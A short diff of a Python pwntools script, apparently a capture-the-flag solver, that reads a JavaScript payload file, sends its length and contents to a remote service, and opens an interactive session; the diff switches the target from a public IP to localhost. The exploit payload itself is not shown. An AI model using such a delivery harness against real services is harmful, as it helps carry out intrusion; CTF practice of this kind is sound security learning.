@@ -2,12 +2,13 @@
 
 from pwn import *
 
-with open("./solve.js", "rb") as f:
+with open("./pwn.js", "rb") as f:
     payload = f.read()
 
-io = remote("13.201.224.182", 32598)
+io = remote("localhost", 5555)
 
 io.sendline(str(len(payload)).encode())
 io.send(payload)
 
+io.clean()
 io.interactive()
